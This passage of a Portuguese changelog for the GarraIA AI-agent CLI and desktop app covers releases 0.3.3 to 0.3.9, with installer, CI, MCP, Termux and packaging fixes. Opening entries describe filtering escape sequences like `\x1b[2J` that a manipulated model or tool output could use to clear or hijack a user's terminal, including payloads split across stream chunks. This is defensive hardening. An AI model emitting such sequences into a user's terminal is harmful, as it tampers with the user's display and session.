  texto que parece ter vindo do proprio Garra. O caso mais pontudo era
  `\x1b[?25l`: o projeto tem invariante explicita de que essa sequencia nao e
  emitida em lugar nenhum, para que nenhum caminho de saida deixe o terminal
  sem cursor — e saida de ferramenta a violava. Agora todo controle C0, C1 e
  DEL sai, no `garraia-agents`, junto da redacao de segredo e antes do
  truncamento (truncar antes deixaria meia sequencia passar, pela mesma razao
  que ja valia para segredo). A seguranca vem da regra por caractere, nao do
  reconhecimento de sequencia: sem `ESC`, `[2J` e texto inerte. O
  reconhecimento de CSI e OSC que existe serve so para legibilidade, porque
  saida colorida e comum e legitima e trocar so o `ESC` por marcador deixaria
  ruido na tela do caso normal. Vale para o resumo do input tambem — o
  `command` do bash tambem vem de fora.
- **O texto do modelo tambem para de injetar comando no terminal (#996).** O
  #995 fechou a superficie da ferramenta; esta e a irma. O `write_delta`
  escrevia o delta do modelo direto no terminal, entao um modelo induzido a
  emitir `\x1b[2J` limpava a tela de quem estava conversando, e `\x1b[?25l`
  deixava o terminal sem cursor — a mesma invariante do CLAUDE.md violada por
  outro caminho. Vale tambem para aviso, erro e dica, que carregam texto de
  fora (corpo de erro de provedor, por exemplo).
- **O filtro tem estado, e e isso que o distingue do #995.** Aquele recebe a
  saida da ferramenta inteira e decide olhando o texto todo. Este nao: o texto
  do modelo e streaming, e `\x1b` pode chegar num delta e `[2J` no seguinte —
  cada metade inofensiva isolada, e um filtro sem estado deixaria as duas
  passarem, com o terminal executando a concatenacao. Ha teste que varre
  **todos** os cortes possiveis de uma carga hostil, nao so um escolhido a
  dedo. O `finish` do turno limpa o pendente, senao um `ESC` no fim de uma
  resposta engoliria o primeiro caractere da proxima.
- **Cor do modelo fica bloqueada, e nao por conservadorismo.** A issue deixava
  em aberto se o modelo devia poder emitir cor de proposito, como algumas CLIs
  permitem. A resposta sai de um principio que o projeto ja tem escrito:
  respeitar `NO_COLOR`, non-TTY e saida redirecionada. Cor vinda do modelo
  passa por cima disso — ela nao sabe se o usuario pediu `NO_COLOR`, se a saida
  vai para um pipe, ou se o terminal e legado. Quem decide cor e o
  `TerminalRenderer`, olhando `Capabilities`; o modelo escreve texto.
- **Teto para sequencia sem terminador.** Um `ESC ]` solto engoliria a resposta
  inteira em silencio, porque OSC so termina em `BEL` ou `ESC \`. Com teto de
  128 caracteres, o pior caso e perder um trecho curto.

## [0.3.8] - 2026-09-04

Corrige uma falha de boot do gateway que deixou a `main` vermelha logo apos a
v0.3.7, e fecha a lacuna de verificacao que a issue #910 expos no pipeline de
release.

### Fixed
- **O boot do gateway nao baixa mais do npm no caminho critico (#916).**
  `McpPersistenceService::provision_filesystem_if_missing()` gravava, no
  primeiro start, uma entrada MCP com `command: "npx"` e
  `args: ["-y", "@modelcontextprotocol/server-filesystem", ...]`. O boot
  seguinte spawnava esse servidor, e o `-y` **baixa o pacote do npm na
  primeira execucao** — dentro do orcamento de start. Em runner de CI, com
  cache do npm frio, isso estourava os 35 s do passo "Start gateway" e
  derrubava quatro jobs de forma deterministica (o re-run falhou nos mesmos
  jobs e nos mesmos passos). Novo opt-out explicito
  `GARRAIA_DISABLE_MCP_AUTOPROVISION`, cobrindo os dois call sites
  (`server.rs` e `state.rs`).
- **Fixtures de teste deixam de ler o config dir real da maquina (#916).**
  `rest_v1_me.rs` e `router_smoke_test.rs` eram os dois unicos que subiam o
  gateway sem desviar `GARRAIA_CONFIG_DIR`, entao liam o `~/.config/garraia`
  do desenvolvedor e spawnavam os servidores MCP que estivessem la. O opt-out
  sozinho nao os salvava: ele impede *gravar* a entrada, nao *spawnar*
  servidores de um `mcp.json` que ja exista. Medido com o `mcp.json` poluido
  presente e o cache do npx frio, o `rest_v1_me` foi de 40,56 s em falha para
  0,27 s passando.
- **O fixture do `projects_test.rs` nao engole mais o erro de boot.** O
  `let _ = server.run()` descartava qualquer falha de start, e o laco de
  espera retornava em silencio ao esgotar o orcamento, empurrando a falha
  para um `ConnectionRefused` sem contexto la na frente.

### Added
- **Guarda de plataforma do asset Android no `release.yml`.** O pipeline
  checava se `garraia-android-aarch64` **existe**, nunca se ele **e** Android.
  Um binario glibc com o nome do asset Android passa no checksum — o arquivo e
  exatamente o que foi publicado — e morre no `exec` dentro do Termux, que e
  literalmente o relato da issue #910. Novo passo entre o empacotamento e o
  upload assere via `readelf` que o interpreter e `/system/bin/linker64` e que
  a machine e `AArch64`. Se disparar, o asset nao sobe e o `::error` de asset
  ausente ja existente avisa: publicar nenhum binario Android e melhor que
  publicar um glibc renomeado.
- **`SOUL.md` e `SOUL.EN.md` (#917).**

## [0.3.7] - 2026-09-03

Retorno de campo da Fase 0 do Garra Mobile: cinco issues (#909-#913) abertas
por um usuario rodando a v0.3.6 num Samsung A16 / Android 13 / Termux, com o
Garra em producao orquestrado por outro agente via MCP. Detalhes e rationale
no Amendment 2026-09-03 da
[ADR 0016](docs/adr/0016-mobile-termux-local-first.md).

### Fixed
- **Filhos MCP no Termux nao ficam mais orfaos (#913).**
  `apply_parent_death_signal` estava sob `#[cfg(target_os = "linux")]`, e em
  Rust `target_os = "android"` **nao** e coberto por isso — embora o bionic
  exponha o mesmo `prctl(PR_SET_PDEATHSIG)`. Na pratica, todo servidor MCP
  filho spawnado dentro do Termux sobrevivia a morte abrupta do gateway
  (`crates/garraia-agents/src/mcp/manager.rs`).
- **Servidores MCP npm/pip voltam a executar no Termux (#913).** No Android o
  exec de ELF resolve atraves do shim termux-exec; um host que spawna o
  gateway com ambiente filtrado (`env -i PATH=... HOME=...`) remove
  `LD_PRELOAD`, e a partir dai todo filho que e script npm/pip morre no
  shebang `/usr/bin/env node` — caminho que o Termux nao tem. O novo
  `termux_ld_preload` injeta o shim nos filhos sob `cfg(target_os =
  "android")`, sem nunca sobrescrever um `LD_PRELOAD` do config do servidor
  nem herdado do processo, e exigindo o shim de fato instalado
  (`pkg install termux-exec`).

### Added
- **Wrapper `garra-mcp-server` para hosts MCP externos (#909).** Quando um
  host spawna `garraia mcp-server` com ambiente filtrado, o exec falha
  **antes** de o processo existir — nenhuma correcao dentro do binario
  alcanca o caso. O `install.sh` passa a escrever
  `$PREFIX/bin/garra-mcp-server` no ramo Android: um wrapper que exporta o
  shim (quando instalado) e faz exec do CLI. Aponte o host para ele em vez de
  `garraia mcp-server`. Shebang com caminho absoluto do Termux de proposito —
  `/usr/bin/env` nao existe la. Arquivo novo e aditivo: nenhum asset de
  release e tocado.
- **Bloco Termux acionavel no `garra doctor` (#909/#911/#913).** Sete
  verificacoes com o passo seguinte de cada item que falta: trust store TLS em
  uso, `SSL_CERT_FILE` (cobrado apenas quando ha Postgres configurado,
  detectado por presenca de env var e nunca pelo valor), termux-exec,
  `LD_PRELOAD` herdado, wrapper MCP instalado e `$PREFIX/bin` no PATH. So
  aparece dentro do Termux e nao altera exit code — diagnostico nao e
  veredito.

### Changed
- **Job `android` no CI, e o alvo deixa de quebrar so na tag.** Ate aqui
  `aarch64-linux-android` era compilado apenas no `release.yml`, entao uma
  quebra do target so aparecia **depois** de a tag ser empurrada — foi assim
  que o bug do cargo-ndk 4.x (`-p` deixou de ser `--platform` e virou
  `--package`) derrubou o job android da v0.3.6. O job novo roda
  `cargo ndk check` em cada PR.
- **Guarda contra `rustls-platform-verifier` no grafo Android (#911).** Esse
  crate entra em panic fora da JVM (`Expect rustls-platform-verifier to be
  initialized`, `android.rs:90`), e num binario standalone do Termux nao
  existe Context Java nenhum. Hoje ele fica fora do grafo do `garra` por
  acidente feliz de features — o `reqwest 0.13` que o traz so ativa a feature
  `rustls` via `tauri-plugin-updater`, e `garraia-desktop` nunca e buildado
  para Android. Um bump que ative essa feature em qualquer ponto do grafo do
  CLI quebraria **todo** o HTTPS no Termux em runtime, silenciosamente; a
  guarda e o alarme. (Registrando o corolario: todo o HTTPS do `garra` usa
  webpki-roots compilados no binario, entao `SSL_CERT_FILE` nao afeta esse
  trafego — a excecao e TLS de Postgres, via `sqlx`/native-roots.)
- **Sonda de endpoints valida o frescor do `install.sh` servido (#910).** Dois
  modos de falha ja derrubaram a rota publica do instalador (HTML da home em
  HTTP 200; depois 404 puro). Este e o terceiro e o unico que passava em todas
  as guardas existentes: o endpoint existe, responde 200, tem shebang, parseia
  em `sh -n` — e esta velho. O `install-endpoints.yml` passou a checar um
  marcador de frescor no corpo servido.
- **Asset Android ausente virou `::error` no `release.yml`.** O job segue
  best-effort e a release nao aborta, mas a consequencia nao e "um download a
  menos": o `install.sh` resolve `garraia-android-aarch64` por nome exato,
  entao uma tag sem o asset quebra a instalacao no Termux por completo.
- **Documentacao Termux ponta a ponta (#912).** `docs/installation.md` — o doc
  canonico, para onde o README aponta — nao tinha uma unica mencao a Android
  ou Termux. Ganhou `### Android (Termux)` no Quick Install, a linha que
  faltava na tabela de assets, `### Build on Termux (fallback)` com o override
  de LTO (o `[profile.release]` usa `lto = true`, e num aparelho intermediario
  o linker e morto por OOM com um `Signal 9` pelado, sem nada apontando para
  memoria) e tres secoes de troubleshooting. `docs/mcp.md` e
  `docs/cli-mcp-server.md` cobrem as duas direcoes de MCP, que sao problemas
  distintos com correcoes distintas.

## [0.3.6] - 2026-09-02

### Added
- **Garra no Android (Termux) — Fase 0 do Garra Mobile Local
  ([ADR 0016](docs/adr/0016-mobile-termux-local-first.md)).** Novo asset
  best-effort `garraia-android-aarch64` (job `build-android-arm64` no
  `release.yml`, alvo bionic `aarch64-linux-android` via cargo-ndk — musl
  proibido no Android por quebrar DNS), branch Termux no `install.sh`
  (detecção por `$TERMUX_VERSION` ou `$PREFIX` *com.termux*; default
  `$PREFIX/bin`, sem sudo, skip do preflight glibc, notice sobre o phantom
  process killer e bateria; nada muda fora do Termux), braço
  `("android", "aarch64")` no `garra update` e suíte nova
  `tests/install_sh/detect_platform.sh` no job de shellcheck. Onboarding:
  `curl install.sh | bash` → `garraia doctor` → `garraia chat`.
- **`garra doctor` — diagnóstico da instalação numa passada.** Quatro
  seções (diretórios, config via `config check`, providers com fonte de
  credencial presence-only, daemon via pidfile+porta) com flags `--json` e
  `--strict` e exit codes sysexits 0/2/65, no padrão do `config check`.
  Probes TCP dos daemons locais keyless (ollama/llamacpp) passam pelo
  guard SSRF (`IpScope::AllowPrivate` — loopback/LAN liberados,
  link-local/CGNAT/multicast continuam bloqueados); probes são
  diagnóstico e nunca afetam o exit code.
- **Provider `llamacpp` keyless no CLI e no gateway.** `garra chat
  --provider llamacpp` / `garra ask` falam com um llama-server local
  (default `http://localhost:8080`, `--url` vence a config), `garraia
  config set-model --provider llamacpp` aceito sem credential, e o boot
  loop do gateway ganhou o braço espelhando ollama — `config check`
  continua truthful (lockstep `provider_key_env`).

## [0.3.5] - 2026-09-01

### Added
- **Garra Desktop para Linux (`.deb` + AppImage).** Novo job best-effort
  `build-linux-desktop` no `release.yml` (e gate de PR `build-linux-bundles`
  no `desktop.yml`) empacota o app desktop com o bundler do próprio Tauri via
  `scripts/build-desktop-linux.sh` — irmão do `build-installer.ps1`. Assets
  novos e **aditivos** (regra 15): `garraia-desktop-linux-x86_64.deb` e
  `garraia-desktop-linux-x86_64.AppImage`, ao lado dos pacotes da CLI. O deb
  declara `Provides/Conflicts/Replaces: garraia` porque instala o sidecar em
  `/usr/bin/garraia`, mesmo path do deb da CLI — instalar o desktop substitui
  o pacote da CLI mantendo o comando `garraia`. Antes não existia app desktop
  para Linux em release nenhuma: quem baixava o AppImage esperando o papagaio
  recebia a CLI de terminal. Ver `docs/installation.md` §"Garra Desktop on
  Linux" e o Amendment 2026-09-01 do ADR 0015.
- **Garra Chat Bar.** Nova barra de chat flutuante do Garra Desktop: nasce
  visível no topo central do monitor primário, arrastável pelo grip, e
  conversa com o Garra pela mesma sessão `parrot-desktop` do papagaio (um
  único fio de histórico, persistido em SQLite pelo gateway). Oculta/reaparece
  por ✕, Esc, item "Chat Bar" da bandeja ou `Ctrl+Space`; posição e
  visibilidade sobrevivem a restarts em `chat-bar.json` no diretório de
  config do app (persistência manual — o `tauri-plugin-window-state`
  restauraria também o tamanho e brigaria com o expand/collapse do painel).
  O painel de resposta expande a janela via comando Rust
  (`set_chat_bar_expanded`), então a webview não precisa da capability
  `core:window:allow-set-size`. Em Wayland (default do Ubuntu) o WM não
  honra always-on-top/skip-taskbar — a barra funciona como janela normal.

- **Streaming no `/ws/parrot`.** O gateway passa a emitir cada delta do LLM
  como um frame `{"type":"chunk","text":...}` (via
  `process_message_streaming_with_agent_config`), fechando com o
  `{"type":"response"}` completo — autoritativo, então cliente que perder
  chunks termina consistente. O papagaio e a chat bar já tinham o handler de
  `chunk` pronto (era código morto desde o início); agora ele anima de
  verdade. O loop drena os deltas concorrentemente ao task do agente (canal
  limitado — mesma lição do `stream_turn` do `garra chat`).

### Changed
- **`garraia-auth` migra para argon2 0.6 + pbkdf2 0.13 + password-hash 0.6.1**
  (GAR-669 slice 3, fecha o alerta Dependabot #430); PHC parsing do `build.rs`
  ajustado, sem mudança de formato de hash. *(Registrado retroativamente em
  2026-09-02.)*
- **Quick Chat evolui para a Chat Bar.** A janelinha centrada do `Ctrl+Space`
  (`quick-chat.html`/`quick_chat.rs`) foi substituída pela barra; o atalho e o
  item da bandeja agora alternam a barra. O cliente WebSocket que estava
  copiado-e-colado em `parrot.js` e `quick-chat.html` virou o compartilhado
  `ui/ws.js` (uma cópia a menos, e a terceira nunca nasceu).

### Fixed
- **CI e instaladores**: `install-endpoints.yml` sobrevive a `errexit` e imprime
  o código HTTP de cada sonda (#892); `tests/install_ps1/platform.ps1` em ASCII
  puro para o PSScriptAnalyzer; `set -euo pipefail` no `Get version` do
  `package-linux`. *(Registrado retroativamente em 2026-09-02.)*
- **O papagaio do Garra Desktop voltou a aparecer.** O sprite
  `crates/garraia-desktop/ui/assets/parrot-sprite.png` estava no `.gitignore`
  ("binário grande" — na verdade 32KB) e nenhum build de CI executava o
  `gen_sprite.py`, então todo instalador da v0.3.4 (MSI/NSIS) embarcava a
  janela do overlay 100% transparente: um retângulo invisível de 220x320 no
  canto inferior direito que ainda comia cliques. Instaladores antigos
  (v0.2.1) funcionavam porque eram gerados em máquina de dev que tinha o
  sprite. O PNG agora é commitado, o `.gitignore` documenta a regra nova e o
  `desktop.yml` ganhou o job `assert-ui-assets`: todo `assets/...`
  referenciado em `ui/` precisa existir em disco e o sprite precisa ser um
  PNG 1280x600 (byte-compare com regeneração foi rejeitado de propósito —
  a saída do zlib varia entre builds).
- **`overlay.rs` não derruba mais o app sem monitor.** `create_overlay`
  dava `panic!("No monitor found")` em sessão headless/RDP (violação da
  regra nº 4 do CLAUDE.md); agora cai para posição fixa `(100, 100)`.
- **READMEs da raiz ensinavam o nome errado do sidecar.** `README.md` e
  `README.pt-BR.md` mandavam stagear `binaries/garra-<triple>`, mas o
  `externalBin` é `binaries/garraia` — quem seguisse o doc construía um
  desktop cujo gateway nunca subia (o mesmo bug corrigido no app em #878).
- **`settings.html` sem versão fóssil nem controles mortos.** A página
  exibia `v0.2.0` hardcoded (quatro minors atrás) e os toggles de
  autostart/som nunca tiveram listener; a versão agora vem de
  `app.getVersion()` e os toggles saíram (autostart vive na bandeja).

- **`.deb` volta a carregar `LICENSE`/`README.md`.** O `packaging/nfpm.yaml`
  marcava os docs com `type: doc`, que é um tipo **exclusivo do RPM** no nfpm
  ("ignored by other packagers") — o `garraia-linux-*.deb` da v0.3.4 saiu só
  com `/usr/bin/garraia`, sem o aviso MIT que uma redistribuição deve
  carregar (o `.rpm` e os archives não foram afetados). Removido o
  `type: doc`: como arquivos comuns, `LICENSE`/`README.md` entram nos dois
  pacotes; o custo aceito é perder a marcação `%doc` no rpm. Vale a partir
  da próxima release.

## [0.3.4] - 2026-08-31

### Added
- **`garra agents setup|status|link|rollback|web`** (plan 0360): front-end do
  AgentDeck que provisiona GarraIA, OpenClaw, Hermes e Claude Code com um mesmo
  provedor+modelo; e **`POST /v1/messages`**, shim Anthropic-compatible no
  gateway para o Claude Code apontar para o Garra
  ([ADR 0014](docs/adr/0014-anthropic-messages-shim.md)). *(Registrado
  retroativamente em 2026-09-02.)*
- **`garra chat` ganha indicador de atividade** (spinner que nunca esconde o
  cursor, fallback ASCII) e `Ctrl+C` passa a cancelar o turno em vez de matar
  o processo (#884). *(Retroativo.)*
- **Interop Hermes ↔ Garra via MCP** (#859) e workflow
  `codeql-apply-dismissals.yml` (#871). *(Retroativo.)*
- **Instalador de uma linha para Windows.** Novo `install.ps1`, irmão do
  `install.sh` e em paridade de comportamento com ele:
  `irm https://garraia.org/install.ps1 | iex` detecta a plataforma, resolve a
  release, verifica o SHA-256 contra o `SHA256SUMS`, instala `garraia.exe` em
  `%LOCALAPPDATA%\Programs\GarraIA`, registra no PATH do usuário e encadeia
  `init` + `start` — sem exigir administrador. Antes, a instrução para Windows
  era "baixe o binário na página de releases", sem PATH nem verificação.
  Flags via `& ([scriptblock]::Create((irm ...))) -SkipSetup`, já que
  `irm | iex` não recebe argumentos; toda flag tem uma `GARRAIA_*`
  equivalente, e a env var setada pelo chamador vence a flag.
- **Archives em todas as plataformas.** Cada release passa a trazer
  `.tar.gz` (Linux/macOS) e `.zip` (Windows) contendo o binário com o nome
  simples `garraia`/`garraia.exe` mais `LICENSE` e `README.md`. **Aditivo**:
  os binários crus continuam publicados sem alteração, porque o
  `garra update` resolve assets por nome exato.
- **Instaladores desktop do Windows (MSI + NSIS) de volta ao pipeline.**
  Nenhum `.msi` era publicado desde a v0.2.1 — `scripts/build-installer.ps1`
  existia mas nenhum workflow o invocava. Agora há o job best-effort
  `build-windows-installer` no `release.yml` e o `desktop.yml`, que constrói o
  crate Tauri nos PRs que o tocam (a primeira cobertura de CI que esse crate
  já teve). Os instaladores **não são assinados** — o SmartScreen avisa.
- **Suítes de teste do `install.ps1`** em `tests/install_ps1/` (84 asserções)
  e o job `installer-powershell` no CI, com PSScriptAnalyzer bloqueante e
  matriz PowerShell 7 (Linux) + Windows PowerShell 5.1.
- **Pacotes Linux: `.deb`, `.rpm` e AppImage.** Novo job best-effort
  `package-linux` no `release.yml` empacota os binários já buildados em
  `garraia-linux-{x86_64,aarch64}.deb`/`.rpm` (nfpm 2.47.0, instala
  `/usr/bin/garraia`; o `.deb` declara `libc6 >= 2.35`) e
  `garraia-linux-x86_64.AppImage` (appimagetool 1.9.1) — ferramentas pinadas
  por versão + SHA-256 no workflow. Nomes de asset sem versão para URLs
  `/releases/latest/download/` estáveis; tudo aditivo aos binários crus
  (regra 15). Decisão de toolchain: ADR 0015.
- **Binário nativo Windows ARM64 (best-effort).** Novo job
  `build-windows-aarch64` (cross-compile `aarch64-pc-windows-msvc`) publica
  `garraia-windows-aarch64.exe` + `.zip`. O `garra update` ganha o mapeamento
  `(windows, aarch64)` — com o primeiro módulo de testes do `update.rs` — e o
  `install.ps1` passa a instalar o nativo em hosts ARM64 em vez do x86_64 sob
  emulação. Pinar `GARRAIA_VERSION < v0.3.4` em ARM64 agora dá 404: caveat
  documentado, mesmo precedente do install.sh em Apple Silicon pré-v0.2.1.
- **Suíte `tests/install_ps1/platform.ps1`** (mapeamento de arquitetura,
  WOW64, rejeição de 32-bit) e casos mixed novos nos `checksum_format` dos
  dois instaladores cobrindo `.deb`/`.rpm`/`.AppImage` — o nome cru continua
  selecionando só a própria linha do `SHA256SUMS` (invariante aditivo).

### Fixed
- **Sidecar do Garra Desktop nunca era encontrado.** `src/gateway.rs:14` chama
  `.sidecar("garraia")` enquanto o `tauri.conf.json` declarava
  `externalBin: ["binaries/garra"]`. Como o Tauri resolve o sidecar pelo
  basename do `externalBin`, o app instalava e **nunca subia o gateway**,
  registrando apenas "gateway sidecar not found" no stderr. O `desktop.yml`
  passa a asseverar que os dois nomes coincidem.
- **`scripts/build-installer.ps1` podia passar sem produzir nada.** Usava
  `-ErrorAction SilentlyContinue` e só imprimia quando encontrava o bundle, de
  modo que um `cargo tauri build` que saísse 0 sem emitir MSI deixava o script
  verde. Agora falha alto.
- **Drift de versão do crate desktop.** `tauri.conf.json` e
  `src-tauri/Cargo.toml` estavam presos em `0.3.0` com a workspace em `0.3.4`.
  O Cargo passa a herdar (`version.workspace`) e o campo `version` do JSON foi
  removido, já que o Tauri v2 cai para a versão do crate.
- **`GARRAIA_BOOTSTRAP_LOCAL` documentado ao contrário no wiki.**
  `wiki/Instalacao-e-Primeiros-Passos.md` dizia `=1` "usa artefatos locais em
  vez de baixar"; o valor é `=0` e ele suprime os prompts de GPU/Ollama do
  wizard (`install.sh:35-38`).
- **`ROADMAP.md` afirmava cobertura "Windows MSI"** em duas linhas (`:47`,
  `:84`) que a automação não sustentava. Reconciliado agora que sustenta.

- **`garraia --model <tag>` abre o chat direto no modelo local.** Rodar o
  binário só com flags (sem subcomando) agora entra no REPL — antes o clap
  respondia *unexpected argument* porque o subcomando `chat` só era injetado
  quando o argv estava totalmente vazio. A tag é normalizada (`qwen3.8` →
  `qwen3.8:latest`) e procurada no daemon Ollama local via `GET /api/tags`;
  em acerto exato o provider Ollama é escolhido, mesmo que o `config.yml`
  aponte para outro default. A sonda tem timeout de 2 s e só vence com acerto
  exato, então `--model gpt-4o` nunca é sequestrado para um provider local.
- **Download do modelo faltante.** Com terminal, o GarraIA pergunta antes de
  baixar; com `-y`/`--yes` (novo em `chat` e `ask`) baixa direto; sem
  terminal nunca pergunta — imprime `ollama pull <tag>` no stderr e segue.
  Usa `POST /api/pull` do daemon (não `ollama pull`), então funciona sem o
  binário no `PATH` e respeita `OLLAMA_BASE_URL` remoto. O progresso vai
  para o stderr, preservando o stdout de uma linha do `ask --json`.
- **Seletor de modelo no `garraia init`.** O wizard passou de um `Confirm`
  fixo no Qwen3-14B para uma lista (Qwen 3.8 27B, Qwen 3 8B, Qwen3-14B GGUF,
  Llama 3.1) mais a opção de **digitar qualquer tag do Ollama**, incluindo
  referências de registry (`hf.co/user/repo:Q4_K_M`).
- **`garraia config set-model`** — configuração headless: grava uma entrada
  no `llm:` e a torna `agent.default_provider`, sem prompt algum. O resto do
  `config.yml` fica intacto e o default anterior é rebaixado para
  `fallback_providers` em vez de descartado. Arquivo gravado com modo `0600`.
- **Flags no `install.sh`** — `--skip-setup`, `--skip-init`, `--skip-start`,
  `--no-local`, `--version <tag>`, `--install-dir <dir>`, `--help`. `curl …
  | sh` não consegue passar variáveis de ambiente para o shell do pipe;
  `curl … | sh -s -- --skip-setup` consegue. Uma env var já definida pelo
  chamador ganha da flag correspondente. Nova suíte
  `tests/install_sh/parse_args.sh` (18 casos) ligada ao CI.
- Nova página `docs/integrations/ollama-launch.md` cobrindo o modelo padrão,
  a resolução do `--model` e o que falta para `ollama launch garraia`.
- **`contrib/ollama-launch/`** — a integração Go do `ollama launch`, pronta
  para virar PR no `ollama/ollama`: `garraia.go` (implementa `Runner` +
  `ManagedSingleModel`, espelhando `cmd/launch/hermes.go`), `garraia_test.go`
  (10 testes) e o patch do `registry.go`. Escrita contra o `ollama/ollama`
  real e validada lá dentro — `gofmt` e `go vet` limpos, `go build ./...` ok
  e a suíte `./cmd/launch/` **inteira** verde. Não é código de runtime deste
  repositório: o registro de integrações do Ollama é uma slice Go compilada
  dentro do binário, sem manifesto nem plugin, então a integração só passa a
  existir quando o PR upstream for aceito.
- Teste `test_lopdf_roundtrip_smoke` no `garraia-media` — os 4 testes reais de PDF
  estão `#[ignore]`d desde abril, então até agora o `cargo test` só provava que o
  crate compila contra o lopdf. O novo teste escreve um PDF de uma página com o
  writer do lopdf e o lê de volta por `extract_text_from_bytes`, exercendo
  writer → reader → xref → content stream → extração. Verde na 0.42 e na 0.44.
- **`--model` sem `--provider` não trocava o provider.** `run_chat` só
  substituía a string exibida no banner — o `Arc<dyn LlmProvider>` continuava
  sendo o que o autodetect construiu, com o modelo interno obsoleto. Valia
  para `garraia chat` e `garraia ask`.
- `/model <nome>` no REPL agora normaliza a tag quando o provider é Ollama e
  avisa quando o nome não aparece em `/models`.
- **Binário Linux x86_64 roda em Ubuntu 22.04+ de novo** — o job
  `build-linux-x86_64` usava `runs-on: ubuntu-latest`, que passou a mapear
  para Ubuntu 24.04 (glibc 2.39); os binários da v0.3.2 **e da v0.3.3**
  abortavam com ``version `GLIBC_2.39' not found`` em qualquer sistema com
  glibc mais antiga (ex.: containers Ubuntu 22.04, Debian 12). O runner
  agora é pinado em `ubuntu-22.04`, estabelecendo a baseline suportada:
  **glibc ≥ 2.35** (Ubuntu 22.04+, Debian 12+).
- **`install.sh` checa a glibc antes de baixar** — novo preflight
  `check_glibc` (`MIN_GLIBC=2.35`) falha cedo com mensagem acionável
  (atualizar a distro ou `cargo install --git`) em vez do erro críptico do
  loader depois da instalação. Detecta musl (Alpine) e aponta para build
  from source. Coberto por `tests/install_sh/check_glibc.sh`, registrado no
  job `installer-shellcheck` do `ci.yml` (sem isso a suíte nunca rodaria: o
  job lista cada arquivo de teste explicitamente).

### Changed
- **Breaking: MSRV 1.94 → 1.95** — wasmtime 47 → 48 migra a API WASI e exige
  rustc 1.95 (#865); `ci.yml` ganha o job `MSRV check (1.95)`. *(Retroativo.)*
- **sqlx 0.9** (#868): `SqlSafeStr` enforçado pelo compilador — `sqlx::query*()`
  só aceita `&'static str`; `AssertSqlSafe` restrito a alvos de teste (regra 5
  do CLAUDE.md). *(Retroativo.)*
- **`rmcp` 1.7 → 2.2**, alinhando os tipos de modelo à spec MCP 2025-11-25
  (upstream `rust-sdk#927`). O SDK dissolveu duas camadas: `Content`
  (`= Annotated<RawContent>`) e o próprio `RawContent` viraram o enum achatado
  `ContentBlock`, e `PromptMessageRole`/`PromptMessageContent` viraram
  `Role`/`ContentBlock`. Migrados os três call sites — a ponte de tools MCP, o
  formatador de prompts e o servidor `garra mcp-server`. O **formato de wire não
  mudou**: o handshake real continua emitindo `{"type":"text","text":…}`, e o
  transcript de evidência em `docs/integrations/hermes-mcp.md` foi regravado a
  partir de uma execução de verdade contra a 2.2.0. Detalhes em `plans/0358`.
- `sse-stream` 0.2.3 → 0.2.5 no lock. O rmcp 2.2.0 declara `sse-stream = "0.2"`
  mas usa `SseStream::from_bytes_stream`, que só existe a partir da 0.2.4 —
  under-specification upstream que quebrava o build com `--features mcp-http`.
- **Modelo Ollama padrão passa a ser `qwen3.8:latest`** (resolve para
  `qwen3.8:27b` — Q4_K_M, ~18 GB, 262 144 tokens de contexto, visão +
  tools), no lugar de `llama3.1`. Atualizado no provider, na CLI, no wizard,
  nos configs de exemplo e na documentação.
- **`detect_provider` recebe o `--model`.** Todos os ramos da cadeia
  (Ollama, Anthropic, OpenAI, OpenRouter, fallback offline e o caminho
  `--url`) passaram a resolver o modelo por `resolve_provider_model`, então
  `detect_provider` e `select_explicit_provider` concordam. Efeito colateral
  intencional: os ramos de nuvem agora também varrem `config.llm[*]` por
  `provider == kind`, e não só `config.llm[<kind>]`.
- A tabela de modelos padrão vive num único lugar
  (`chat::hardcoded_default_model`); as 11 cópias inline dos literais foram
  removidas.
- **lopdf 0.42 → 0.44 com a feature `time` desligada** — a partir da 0.43 o
  `time_impl` do lopdf chama `BorrowedFormatItem::StringLiteral` com um padrão
  estilo strftime; a variante só existe no `time` >= 0.3.49 (fixamos 0.3.47), então
  o build morria com `error[E0599]` em 7 jobs de CI. Upstream J-F-Liu/lopdf#518,
  corrigido no master em `1efa2702` mas ainda sem release. O módulo é inteiramente
  `#[cfg(feature = "time")]` e o `garraia-media` não faz nenhuma interop de data/hora
  com o lopdf — `CreationDate`/`ModDate` saem como bytes crus — então
  `default-features = false` + `features = ["chrono", "jiff", "rayon"]` destrava o
  bump sem mudança de comportamento e sem alterar código de produção.
- **OpenSSL agora é vendored/estático** (`native-tls/vendored` via
  garraia-channels, feature discord) — o binário de release não linka mais
  `libssl.so.x` do sistema, e o `pre-build` do `Cross.toml` deixou de
  instalar `libssl-dev:$CROSS_DEB_ARCH` (receita canônica do FAQ do cross).
  Em contrapartida o `openssl-src` compila o OpenSSL do zero, o que exige
  `perl` + `make` no ambiente de build: adicionados ao `Cross.toml` e ao
  `Dockerfile` (que roda em `rust:1.98-slim`, sem nenhum dos dois). O
  `security-gate-bola.yml` — único job que restaura `target/` do cache —
  ganhou o mesmo passo de liberação de disco que o job `coverage` do
  `ci.yml` já usava: com o OpenSSL dentro de `target/`, o cache restaurado
  estourava os ~14 GB do runner e o matava sem logs. O
  `native-tls` só usa OpenSSL em Linux — Windows (schannel) e macOS
  (Security.framework) não são afetados. Nota: migrar o serenity para
  `rustls_backend` está bloqueado — o 0.12.5 mapeia a feature para
  `reqwest/rustls-tls`, removida no reqwest 0.13, que o tauri ^0.13 prende
  no lock; reavaliar quando o serenity suportar reqwest 0.13.

### Security
- **Guard SSRF centralizado** em `garraia_common::ssrf` (`vet_url` +
  `pinned_client`): toda requisição HTTP de saída cuja URL vem de request,
  config editável ou tool call de LLM passa pelo guard (#869, #883, #889; regra
  14 do CLAUDE.md). *(Retroativo.)*
- **RUSTSEC-2026-0192 fechado estruturalmente** — na 0.44 o `ttf-parser` passou a ser
  opcional atrás da feature `font_embedding`, que não usamos (nem `FontData` nem
  `add_font`). O `ttf-parser 0.25.1` (não mantido, sem upgrade seguro) saiu do
  `Cargo.lock` e o ignore correspondente foi removido do `deny.toml`.

## [0.3.3] - 2026-08-27

### Added
- **Wiki versionado e publicado automaticamente** (#855) — a fonte de verdade do
  GitHub Wiki agora vive em `wiki/` neste repo (Home + 7 páginas: Instalação,
  Referência da CLI, Configuração, Guias de Integração, Arquitetura+ADRs,
  Segurança+Operação, Contribuir/Roadmap/FAQ), revisável por PR; o workflow
  `wiki-sync.yml` publica no `GarraRUST.wiki` via `GITHUB_TOKEN` a cada push
  no `main`.

### Fixed
- **Clippy do stable 1.98 destravado** (#854) — o lint novo
  `clippy::chunks_exact_to_as_chunks` derrubava o job Clippy no `main` e em
